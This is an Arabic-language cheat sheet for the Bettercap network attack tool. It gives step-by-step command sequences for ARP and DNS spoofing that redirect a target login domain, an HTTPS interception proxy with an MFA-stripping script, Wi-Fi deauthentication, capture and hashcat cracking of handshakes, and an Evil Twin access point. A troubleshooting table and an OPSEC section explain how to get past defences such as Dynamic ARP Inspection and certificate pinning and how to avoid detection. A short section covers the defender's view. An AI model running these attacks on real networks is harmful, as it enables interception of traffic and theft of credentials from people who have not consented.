# دليل أداة Bettercap الشامل

تُعد أداة `Bettercap` "المشرط السويسري" الحديث للعمليات الهجومية على الشبكات. صُممت لتكون البديل المتطور لأدوات كلاسيكية مثل ettercap و MITMf، حيث تعتمد على نواة لغة Go وتوفر واجهة تفاعلية (REPL) متقدمة. تغطي وحداتها البرمجية نطاقاً واسعاً يشمل انتحال الهوية (Spoofing) عبر بروتوكولات ARP/DNS/DHCP/HTTPS، واختراق شبكات Wi-Fi (عبر هجمات PMKID و Evil Twin)، واستطلاع تقنية Bluetooth LE، وحقن أجهزة HID، وبناء البوابات الأسيرة (Captive Portals).

## التثبيت (Install)

```terminal
apt install bettercap
brew install bettercap
go install github.com/bettercap/bettercap@latest
```

يجب التشغيل بصلاحيات الجذر (Root) لتمكين الوصول إلى المقابس الخام (Raw Sockets) وواجهات الشبكة.

## الواجهة البرمجية (Interface)

```terminal
sudo bettercap -iface eth0
> help
> help <module>          # عرض توثيق وحدة معينة
```

استخدم مفتاح (Tab) للإكمال التلقائي للأوامر.

## عائلات الوحدات (Module families)

| العائلة | الوحدات | الوظيفة |
|--------|---------|---------|
| **net** | `net.recon`, `net.probe`, `net.show`, `net.sniff` | استطلاع الشبكة وتحليل الحزم |
| **arp** | `arp.spoof` | انتحال هوية ARP |
| **dns** | `dns.spoof` | تسميم سجلات DNS |
| **dhcp** | `dhcp6.spoof` | هجمات بروتوكول DHCPv6 |
| **http** | `http.proxy`, `https.proxy` | اعتراض وتحليل حركة مرور الويب |
| **wifi** | `wifi.recon`, `wifi.deauth`, `wifi.handshakes`, `wifi.assoc`, `wifi.ap` | استهداف واختراق شبكات Wi-Fi |
| **ble** | `ble.recon`, `ble.enum`, `ble.write` | استطلاع والتعامل مع أجهزة Bluetooth LE |
| **hid** | `hid.recon` | استهداف الأجهزة الطرفية اللاسلكية (Logitech وغيرها) |
| **caplets** | سكربتات هجومية جاهزة للتنفيذ | أتمتة العمليات المتكررة |

## منهجية العمل الشائعة — انتحال ARP و DNS في الشبكات السلكية

```
> set arp.spoof.targets 10.0.0.50,10.0.0.51    # استهداف أجهزة محددة بدلاً من الشبكة بالكامل
> set arp.spoof.fullduplex true
> set dns.spoof.address 10.0.0.99
> set dns.spoof.domains login.target.com,target.com

> arp.spoof on
> dns.spoof on
> http.proxy on
> set https.proxy.script /opt/scripts/strip-mfa.js
> https.proxy on
```

في هذا السيناريو، سيتم توجيه طلبات الأجهزة المستهدفة لـ `login.target.com` إلى جهاز المهاجم؛ وسيقوم وكيل HTTPS باعتراض حركة المرور (مع مراعاة قيود شهادات الأمان).

## شبكات Wi-Fi — المصافحة / إلغاء المصادقة / التوأم الشرير

```
sudo bettercap -iface wlan0mon
> wifi.recon on
> events.stream off    # إيقاف التدفق الكثيف للأحداث لتقليل الضجيج

> wifi.deauth AA:BB:CC:DD:EE:FF       # إلغاء مصادقة نقطة وصول محددة (BSSID)
> wifi.deauth AC:DE:48:00:11:22       # إلغاء مصادقة عميل محدد

# بعد التقاط المصافحة الرباعية (4-way handshake):
> wifi.handshakes
> q
sudo cat ~/bettercap-wifi-handshakes.pcap | hcxpcapngtool -o cap.hc22000 -
hashcat -m 22000 cap.hc22000 rockyou.txt
```

### هجوم التوأم الشرير (Evil Twin AP)

```
> wifi.recon on
> wifi.recon AA:BB:CC:DD:EE:FF       # التركيز على الهدف
> set wifi.ap.ssid Acme-Corp
> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
> set wifi.ap.channel 6
> set wifi.ap.encryption false        # إنشاء نقطة وصول مفتوحة
> wifi.ap                              # بدء التشغيل
```

عند دمج هذا مع هجوم إلغاء المصادقة (Deauth) على نقطة الوصول الأصلية، سينتقل المستخدمون تلقائياً إلى النقطة التي يتحكم بها المهاجم.

## استطلاع BLE (Bluetooth Low Energy)

```
> ble.recon on
> ble.show
> ble.enum <addr>
> ble.write <addr> <handle> <hex>      # في حال كانت الخصائص قابلة للكتابة
```

## الـ Caplets — سكربتات قابلة للتكرار

الـ Caplet هو ملف بامتداد `.cap` يحتوي على تسلسل من الأوامر التي يتم تنفيذها داخل الأداة.

```terminal
sudo bettercap -iface eth0 -caplet rogue-mitm.cap
```

توجد نماذج جاهزة في المسار `/usr/share/bettercap/caplets/` مثل: `mitm6`, `wifi-pwn`, `passwords-only`, `dns-spoof`.

## الإضافات والأحداث (Plugins / Events)

- `events.stream off` — وضع الصمت.
- `events.show` — عرض آخر الأحداث الملتقطة.
- `set events.stream.output /tmp/bcap.log` — تسجيل الأحداث في ملف خارجي.

## استكشاف الأخطاء وإصلاحها

| العرض | الحل المقترح |
|---------|-----|
| `failed to set monitor mode` | المحول لا يدعم وضع المراقبة أو لم يتم تفعيله؛ استخدم `airmon-ng start wlan0` أولاً. |
| فشل اعتراض الـ ARP | تفعيل خاصية DAI (Dynamic ARP Inspection) على المحول (Switch)؛ انتقل لهجمات LLMNR / mitm6. |
| فشل اعتراض HTTPS | تفعيل خاصية (Cert Pinning)؛ يتطلب الأمر تثبيت شهادة CA في متصفح الضحية أو محاولة خفض البروتوكول إلى HTTP. |
| فشل إلغاء المصادقة (Deauth) | تفعيل خاصية حماية الأطر الإدارية PMF (802.11w)؛ انتقل إلى هجمات PMKID. |
| فشل الكتابة في BLE | الخاصية غير قابلة للكتابة أو تتطلب مصادقة (Authentication). |

## منظور المدافع (Defender's perspective)

- **انتحال ARP:** يظهر كماك (MAC) واحد يرسل رسائل ARP متكررة؛ أنظمة DAI في المحولات المتطورة ترصد هذا النشاط فوراً.
- **انتحال DNS:** يتلقى العميل عناوين IP تختلف عن المصدر الموثوق؛ مما يؤدي لفشل التحقق من صحة DNSSEC.
- **التوأم الشرير:** تشغيل نفس الـ SSID مع BSSID مختلف؛ ترصد أنظمة اكتشاف اختراق الشبكات اللاسلكية (WIDS) هذا التباين.
- **سجلات النظام:** يمكن رصد هجمات BLE/HID عبر سجلات Sysmon EID على جهاز المهاجم، لكن من الصعب رصدها من جانب الضحية لغياب القياسات الحيوية للبروتوكول.

## اعتبارات العمليات الأمنية (OPSEC)

- حصر انتحال الـ ARP على أهداف محددة لتقليل البصمة الرقمية (Signal) في الشبكة.
- لاعتراض HTTPS بكفاءة أعلى وتجنب المشاكل التقنية، يفضل استخدام `evilginx2` بدلاً من وحدات الـ MITM في bettercap.
- قم دائماً بتغيير عنوان الماك (MAC Spoofing) قبل بدء الهجوم.

## أدوات ذات صلة

- **ettercap:** الإصدار الأقدم والأقل تحديثاً.
- **mitm6:** متخصص في هجمات IPv6 DHCPv6 و DNS؛ فعال جداً في الشبكات التي تدعم البروتوكولين (Dual-stack).
- **Responder:** المتصدر في هجمات تسميم LLMNR / NBT-NS.
- **Pretender:** بديل حديث بلغة Go لبروتوكولات LLMNR / NBT / mDNS / DHCPv6.
- **fluxion / wifiphisher:** أدوات متخصصة في جمع الاعتمادات (Credentials) عبر البوابات الأسيرة.
